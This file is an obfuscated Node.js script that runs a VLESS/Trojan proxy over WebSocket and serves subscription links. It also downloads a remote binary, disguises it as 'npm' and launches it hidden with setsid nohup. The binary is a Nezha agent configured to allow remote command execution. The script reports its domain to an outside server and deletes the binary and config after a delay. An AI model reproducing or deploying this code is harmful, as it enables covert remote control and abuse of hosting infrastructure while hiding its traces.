const _0x2baede=_0x351f;(function(_0x3dac30,_0xff4f59){const _0x509437=_0x351f,_0x3594b9=_0x3dac30();while(!![]){try{const _0x1d5d06=-parseInt(_0x509437(0x17b))/0x1*(-parseInt(_0x509437(0x1ac))/0x2)+parseInt(_0x509437(0x1a0))/0x3*(-parseInt(_0x509437(0x18b))/0x4)+-parseInt(_0x509437(0x163))/0x5*(-parseInt(_0x509437(0x17f))/0x6)+parseInt(_0x509437(0x1b4))/0x7*(parseInt(_0x509437(0x174))/0x8)+-parseInt(_0x509437(0x1d5))/0x9*(-parseInt(_0x509437(0x192))/0xa)+-parseInt(_0x509437(0x1ad))/0xb+parseInt(_0x509437(0x1d0))/0xc*(parseInt(_0x509437(0x183))/0xd);if(_0x1d5d06===_0xff4f59)break;else _0x3594b9['push'](_0x3594b9['shift']());}catch(_0x5316de){_0x3594b9['push'](_0x3594b9['shift']());}}}(_0x322b,0xec102));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x2baede(0x167)),crypto=require(_0x2baede(0x1a7)),{Buffer}=require(_0x2baede(0x1d8)),{exec,execSync}=require(_0x2baede(0x186)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2baede(0x1aa)]['UUID']||'39758e63-c2cf-4f0d-96e0-c2300e410b96',NEZHA_SERVER=process[_0x2baede(0x1aa)][_0x2baede(0x178)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x2baede(0x1a8)]||'',DOMAIN=process[_0x2baede(0x1aa)]['DOMAIN']||_0x2baede(0x1af),AUTO_ACCESS=process[_0x2baede(0x1aa)][_0x2baede(0x1ba)]||!![],WSPATH=process['env'][_0x2baede(0x1b6)]||UUID[_0x2baede(0x189)](0x0,0x8),SUB_PATH=process[_0x2baede(0x1aa)][_0x2baede(0x1ae)]||_0x2baede(0x197),NAME=process[_0x2baede(0x1aa)][_0x2baede(0x1b9)]||_0x2baede(0x1c6),PORT=process[_0x2baede(0x1aa)][_0x2baede(0x17c)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2a3fd9=_0x2baede;try{const _0x26fb98=await axios[_0x2a3fd9(0x181)](_0x2a3fd9(0x1a5)),_0x4ada90=_0x26fb98[_0x2a3fd9(0x190)];ISP=(_0x4ada90[_0x2a3fd9(0x17a)]+'-'+_0x4ada90[_0x2a3fd9(0x179)])['replace'](/ /g,'_');}catch(_0x32b6a7){ISP='Unknown';}};GetISP();const httpServer=http[_0x2baede(0x1cb)]((_0x1d366d,_0x21e924)=>{const _0x383fb3=_0x2baede;if(_0x1d366d[_0x383fb3(0x1d6)]==='/'){const _0x314c30=path[_0x383fb3(0x18a)](__dirname,_0x383fb3(0x198));fs[_0x383fb3(0x1b2)](_0x314c30,_0x383fb3(0x169),(_0xe9d170,_0x5a8c79)=>{const _0x4d22a4=_0x383fb3;if(_0xe9d170){_0x21e924[_0x4d22a4(0x1cf)](0xc8,{'Content-Type':'text/html'}),_0x21e924['end'](_0x4d22a4(0x1a3));return;}_0x21e924['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x21e924['end'](_0x5a8c79);});return;}else{if(_0x1d366d[_0x383fb3(0x1d6)]==='/'+SUB_PATH){const _0x5a84d6=_0x383fb3(0x1ab)+UUID+'@'+DOMAIN+_0x383fb3(0x1b0)+DOMAIN+_0x383fb3(0x166)+DOMAIN+_0x383fb3(0x1ca)+WSPATH+'#'+NAME+'-'+ISP,_0x19f689=_0x383fb3(0x1a6)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x383fb3(0x1ca)+WSPATH+'#'+NAME+'-'+ISP,_0x3609ca=_0x5a84d6+'\x0a'+_0x19f689,_0x5eedfa=Buffer['from'](_0x3609ca)['toString'](_0x383fb3(0x1a4));_0x21e924[_0x383fb3(0x1cf)](0xc8,{'Content-Type':_0x383fb3(0x1d9)}),_0x21e924[_0x383fb3(0x195)](_0x5eedfa+'\x0a');}else _0x21e924[_0x383fb3(0x1cf)](0x194,{'Content-Type':_0x383fb3(0x1d9)}),_0x21e924[_0x383fb3(0x195)](_0x383fb3(0x1b1));}}),wss=new WebSocket[(_0x2baede(0x199))]({'server':httpServer}),uuid=UUID[_0x2baede(0x196)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x2baede(0x1bb)];function resolveHost(_0x4d9fc7){return new Promise((_0xca3b6,_0x242a27)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x4d9fc7)){_0xca3b6(_0x4d9fc7);return;}let _0x21af21=0x0;function _0x350f47(){const _0x307b61=_0x351f;if(_0x21af21>=DNS_SERVERS[_0x307b61(0x177)]){_0x242a27(new Error('Failed\x20to\x20resolve\x20'+_0x4d9fc7+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x209faf=DNS_SERVERS[_0x21af21];_0x21af21++;const _0x33379d='https://dns.google/resolve?name='+encodeURIComponent(_0x4d9fc7)+_0x307b61(0x16e);axios[_0x307b61(0x181)](_0x33379d,{'timeout':0x1388,'headers':{'Accept':_0x307b61(0x1d7)}})['then'](_0x3dd135=>{const _0x33b0eb=_0x307b61,_0x324b20=_0x3dd135[_0x33b0eb(0x190)];if(_0x324b20['Status']===0x0&&_0x324b20[_0x33b0eb(0x1c5)]&&_0x324b20[_0x33b0eb(0x1c5)][_0x33b0eb(0x177)]>0x0){const _0x608396=_0x324b20[_0x33b0eb(0x1c5)]['find'](_0x31a697=>_0x31a697[_0x33b0eb(0x1b8)]===0x1);if(_0x608396){_0xca3b6(_0x608396['data']);return;}}_0x350f47();})['catch'](_0x3fbcdb=>{_0x350f47();});}_0x350f47();});}function _0x351f(_0x747e94,_0x3327ad){const _0x322b66=_0x322b();return _0x351f=function(_0x351f27,_0x4ada15){_0x351f27=_0x351f27-0x162;let _0x192500=_0x322b66[_0x351f27];return _0x192500;},_0x351f(_0x747e94,_0x3327ad);}function handleVlessConnection(_0x84383a,_0x44c472){const _0x5e935c=_0x2baede,[_0x31887b]=_0x44c472,_0x523b0e=_0x44c472[_0x5e935c(0x189)](0x1,0x11);if(!_0x523b0e[_0x5e935c(0x168)]((_0x1c1177,_0x5a18eb)=>_0x1c1177==parseInt(uuid['substr'](_0x5a18eb*0x2,0x2),0x10)))return![];let _0x172be0=_0x44c472[_0x5e935c(0x189)](0x11,0x12)['readUInt8']()+0x13;const _0x20c6c1=_0x44c472[_0x5e935c(0x189)](_0x172be0,_0x172be0+=0x2)['readUInt16BE'](0x0),_0x589f2c=_0x44c472[_0x5e935c(0x189)](_0x172be0,_0x172be0+=0x1)[_0x5e935c(0x1c9)](),_0x385b80=_0x589f2c==0x1?_0x44c472['slice'](_0x172be0,_0x172be0+=0x4)[_0x5e935c(0x18a)]('.'):_0x589f2c==0x2?new TextDecoder()[_0x5e935c(0x16f)](_0x44c472[_0x5e935c(0x189)](_0x172be0+0x1,_0x172be0+=0x1+_0x44c472[_0x5e935c(0x189)](_0x172be0,_0x172be0+0x1)[_0x5e935c(0x1c9)]())):_0x589f2c==0x3?_0x44c472[_0x5e935c(0x189)](_0x172be0,_0x172be0+=0x10)[_0x5e935c(0x1dc)]((_0x3cee0f,_0x1807a1,_0x57e156,_0x315c6d)=>_0x57e156%0x2?_0x3cee0f[_0x5e935c(0x16a)](_0x315c6d['slice'](_0x57e156-0x1,_0x57e156+0x1)):_0x3cee0f,[])['map'](_0x21ceba=>_0x21ceba[_0x5e935c(0x19d)](0x0)[_0x5e935c(0x1c4)](0x10))[_0x5e935c(0x18a)](':'):'';_0x84383a['send'](new Uint8Array([_0x31887b,0x0]));const _0x567933=createWebSocketStream(_0x84383a);return resolveHost(_0x385b80)[_0x5e935c(0x171)](_0x508623=>{const _0x20d22f=_0x5e935c;net[_0x20d22f(0x17e)]({'host':_0x508623,'port':_0x20c6c1},function(){const _0x5cfe05=_0x20d22f;this['write'](_0x44c472[_0x5cfe05(0x189)](_0x172be0)),_0x567933['on']('error',()=>{})[_0x5cfe05(0x16c)](this)['on'](_0x5cfe05(0x1d4),()=>{})['pipe'](_0x567933);})['on'](_0x20d22f(0x1d4),()=>{});})[_0x5e935c(0x1d3)](_0x1fab45=>{const _0x5ee5eb=_0x5e935c;net[_0x5ee5eb(0x17e)]({'host':_0x385b80,'port':_0x20c6c1},function(){const _0x3a9895=_0x5ee5eb;this[_0x3a9895(0x194)](_0x44c472[_0x3a9895(0x189)](_0x172be0)),_0x567933['on'](_0x3a9895(0x1d4),()=>{})['pipe'](this)['on'](_0x3a9895(0x1d4),()=>{})[_0x3a9895(0x16c)](_0x567933);})['on'](_0x5ee5eb(0x1d4),()=>{});}),!![];}function handleTrojanConnection(_0x3720f0,_0x5f0037){const _0x268a35=_0x2baede;try{if(_0x5f0037[_0x268a35(0x177)]<0x3a)return![];const _0x4ae42f=_0x5f0037[_0x268a35(0x189)](0x0,0x38)[_0x268a35(0x1c4)](),_0x21f4a1=[UUID];let _0x1f53eb=null;for(const _0x531513 of _0x21f4a1){const _0x3e50af=crypto[_0x268a35(0x175)](_0x268a35(0x187))['update'](_0x531513)['digest'](_0x268a35(0x1be));if(_0x3e50af===_0x4ae42f){_0x1f53eb=_0x531513;break;}}if(!_0x1f53eb)return![];let _0x5073fc=0x38;_0x5f0037[_0x5073fc]===0xd&&_0x5f0037[_0x5073fc+0x1]===0xa&&(_0x5073fc+=0x2);const _0xdb26c4=_0x5f0037[_0x5073fc];if(_0xdb26c4!==0x1)return![];_0x5073fc+=0x1;const _0x3490f6=_0x5f0037[_0x5073fc];_0x5073fc+=0x1;let _0x5d00f6,_0x17a652;if(_0x3490f6===0x1)_0x5d00f6=_0x5f0037[_0x268a35(0x189)](_0x5073fc,_0x5073fc+0x4)[_0x268a35(0x18a)]('.'),_0x5073fc+=0x4;else{if(_0x3490f6===0x3){const _0x2cebfe=_0x5f0037[_0x5073fc];_0x5073fc+=0x1,_0x5d00f6=_0x5f0037[_0x268a35(0x189)](_0x5073fc,_0x5073fc+_0x2cebfe)[_0x268a35(0x1c4)](),_0x5073fc+=_0x2cebfe;}else{if(_0x3490f6===0x4)_0x5d00f6=_0x5f0037[_0x268a35(0x189)](_0x5073fc,_0x5073fc+0x10)['reduce']((_0x308be7,_0x5ae784,_0x22434f,_0x5919c6)=>_0x22434f%0x2?_0x308be7[_0x268a35(0x16a)](_0x5919c6[_0x268a35(0x189)](_0x22434f-0x1,_0x22434f+0x1)):_0x308be7,[])[_0x268a35(0x1d2)](_0x4eeea9=>_0x4eeea9['readUInt16BE'](0x0)[_0x268a35(0x1c4)](0x10))[_0x268a35(0x18a)](':'),_0x5073fc+=0x10;else return![];}}_0x17a652=_0x5f0037[_0x268a35(0x19d)](_0x5073fc),_0x5073fc+=0x2;_0x5073fc<_0x5f0037['length']&&_0x5f0037[_0x5073fc]===0xd&&_0x5f0037[_0x5073fc+0x1]===0xa&&(_0x5073fc+=0x2);const _0x4b6109=createWebSocketStream(_0x3720f0);return resolveHost(_0x5d00f6)[_0x268a35(0x171)](_0xd61da5=>{const _0x370e56=_0x268a35;net[_0x370e56(0x17e)]({'host':_0xd61da5,'port':_0x17a652},function(){const _0xe5ef2=_0x370e56;_0x5073fc<_0x5f0037[_0xe5ef2(0x177)]&&this[_0xe5ef2(0x194)](_0x5f0037[_0xe5ef2(0x189)](_0x5073fc)),_0x4b6109['on']('error',()=>{})[_0xe5ef2(0x16c)](this)['on'](_0xe5ef2(0x1d4),()=>{})['pipe'](_0x4b6109);})['on'](_0x370e56(0x1d4),()=>{});})[_0x268a35(0x1d3)](_0x2a4166=>{const _0xf08870=_0x268a35;net[_0xf08870(0x17e)]({'host':_0x5d00f6,'port':_0x17a652},function(){const _0x5159a1=_0xf08870;_0x5073fc<_0x5f0037[_0x5159a1(0x177)]&&this[_0x5159a1(0x194)](_0x5f0037['slice'](_0x5073fc)),_0x4b6109['on']('error',()=>{})[_0x5159a1(0x16c)](this)['on'](_0x5159a1(0x1d4),()=>{})[_0x5159a1(0x16c)](_0x4b6109);})['on'](_0xf08870(0x1d4),()=>{});}),!![];}catch(_0x2b83b0){return![];}}wss['on'](_0x2baede(0x19f),(_0x2ac946,_0x533b41)=>{const _0x3de31a=_0x2baede,_0x2267ff=_0x533b41['url']||'';_0x2ac946[_0x3de31a(0x180)](_0x3de31a(0x1cd),_0x51cdc7=>{const _0x23d09a=_0x3de31a;if(_0x51cdc7[_0x23d09a(0x177)]>0x11&&_0x51cdc7[0x0]===0x0){const _0x539117=_0x51cdc7[_0x23d09a(0x189)](0x1,0x11),_0x38a062=_0x539117[_0x23d09a(0x168)]((_0x2a5688,_0x22c33f)=>_0x2a5688==parseInt(uuid['substr'](_0x22c33f*0x2,0x2),0x10));if(_0x38a062){!handleVlessConnection(_0x2ac946,_0x51cdc7)&&_0x2ac946[_0x23d09a(0x173)]();return;}}!handleTrojanConnection(_0x2ac946,_0x51cdc7)&&_0x2ac946['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x4e2d79=_0x2baede,_0x39c04c=os[_0x4e2d79(0x19e)]();return _0x39c04c===_0x4e2d79(0x1da)||_0x39c04c==='arm64'||_0x39c04c==='aarch64'?!NEZHA_PORT?_0x4e2d79(0x1a1):_0x4e2d79(0x191):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x4e2d79(0x1c3);},downloadFile=async()=>{const _0x27ce18=_0x2baede;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x542a33=getDownloadUrl(),_0x38d973=await axios({'method':_0x27ce18(0x181),'url':_0x542a33,'responseType':_0x27ce18(0x16b)}),_0x33de19=fs[_0x27ce18(0x19a)](_0x27ce18(0x1c0));return _0x38d973['data'][_0x27ce18(0x16c)](_0x33de19),new Promise((_0x1c2e87,_0x2baf82)=>{const _0x3538f4=_0x27ce18;_0x33de19['on'](_0x3538f4(0x1c2),()=>{const _0x2f15df=_0x3538f4;console[_0x2f15df(0x188)](_0x2f15df(0x1cc)),exec(_0x2f15df(0x1c1),_0x5e420c=>{if(_0x5e420c)_0x2baf82(_0x5e420c);_0x1c2e87();});}),_0x33de19['on'](_0x3538f4(0x1d4),_0x2baf82);});}catch(_0x27df3c){throw _0x27df3c;}},runnz=async()=>{const _0x177411=_0x2baede;try{const _0x13defb=execSync(_0x177411(0x193),{'encoding':_0x177411(0x1a2)});if(_0x13defb[_0x177411(0x18f)]()!==''){console['log'](_0x177411(0x18e));return;}}catch(_0x261858){}await downloadFile();let _0x2b2ec0='',_0x35db7c=['443',_0x177411(0x1c8),_0x177411(0x172),_0x177411(0x19c),_0x177411(0x164),_0x177411(0x19b)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5933b2=_0x35db7c[_0x177411(0x1b5)](NEZHA_PORT)?_0x177411(0x1d1):'';_0x2b2ec0=_0x177411(0x185)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5933b2+_0x177411(0x1bd);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x242aa8=NEZHA_SERVER[_0x177411(0x1b5)](':')?NEZHA_SERVER[_0x177411(0x165)](':')['pop']():'',_0x10c2ff=_0x35db7c[_0x177411(0x1b5)](_0x242aa8)?_0x177411(0x1b7):_0x177411(0x1bc),_0x42e4d2=_0x177411(0x176)+NEZHA_KEY+_0x177411(0x1db)+NEZHA_SERVER+_0x177411(0x1ce)+_0x10c2ff+_0x177411(0x184)+UUID;fs['writeFileSync'](_0x177411(0x17d),_0x42e4d2);}_0x2b2ec0=_0x177411(0x18c);}else{console[_0x177411(0x188)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x2b2ec0,{'shell':_0x177411(0x1c7)},_0x24442b=>{const _0x3fa20b=_0x177411;if(_0x24442b)console[_0x3fa20b(0x1d4)]('npm\x20running\x20error:',_0x24442b);else console[_0x3fa20b(0x188)](_0x3fa20b(0x1bf));});}catch(_0x4039d6){console[_0x177411(0x1d4)](_0x177411(0x162)+_0x4039d6);}};async function addAccessTask(){const _0x3cdf92=_0x2baede;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x442c87='https://'+DOMAIN;try{const _0x2a75b0=await axios[_0x3cdf92(0x16d)]('https://oooo.serv00.net/add-url',{'url':_0x442c87},{'headers':{'Content-Type':_0x3cdf92(0x1b3)}});console['log'](_0x3cdf92(0x18d));}catch(_0x2d413e){}}const delFiles=()=>{const _0x44d0c6=_0x2baede;fs[_0x44d0c6(0x182)](_0x44d0c6(0x1c0),()=>{}),fs[_0x44d0c6(0x182)](_0x44d0c6(0x17d),()=>{});};httpServer[_0x2baede(0x1a9)](PORT,()=>{const _0x1b5c19=_0x2baede;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x1b5c19(0x170)+PORT);});function _0x322b(){const _0x1ec306=['pipe','post','&type=A','decode','Server\x20is\x20running\x20on\x20port\x20','then','2096','close','8903784wntHEU','createHash','client_secret:\x20','length','NEZHA_SERVER','asOrganization','country','386TJAQhP','PORT','config.yaml','connect','930qRyjvE','once','get','unlink','13eMDMFk','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','setsid\x20nohup\x20./npm\x20-s\x20','child_process','sha224','log','slice','join','4ILfvqX','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Automatic\x20Access\x20Task\x20added\x20successfully','npm\x20is\x20already\x20running,\x20skip\x20running...','trim','data','https://arm64.ssss.nyc.mn/agent','38380njgJxs','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','write','end','replace','sub','index.html','Server','createWriteStream','2053','2087','readUInt16BE','arch','connection','73314BZyxkp','https://arm64.ssss.nyc.mn/v1','utf-8','Hello\x20world!','base64','https://speed.cloudflare.com/meta','trojan://','crypto','NEZHA_KEY','listen','env','vless://','1206QrHKIk','14766862EoEIMX','SUB_PATH','1234.abc.com',':443?encryption=none&security=tls&sni=','Not\x20Found\x0a','readFile','application/json','7LPzZmq','includes','WSPATH','true','type','NAME','AUTO_ACCESS','1.1.1.1','false','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','hex','npm\x20is\x20running','npm','chmod\x20+x\x20npm','finish','https://amd64.ssss.nyc.mn/agent','toString','Answer','Hug','/bin/bash','8443','readUInt8','&path=%2F','createServer','npm\x20download\x20successfully','message','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','writeHead','8517192nyglLe','--tls','map','catch','error','171bxOqJB','url','application/dns-json','buffer','text/plain','arm','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','reduce','error:\x20','6625AOeFOb','2083','split','&fp=chrome&type=ws&host=','path','every','utf8','concat','stream'];_0x322b=function(){return _0x1ec306;};return _0x322b();}
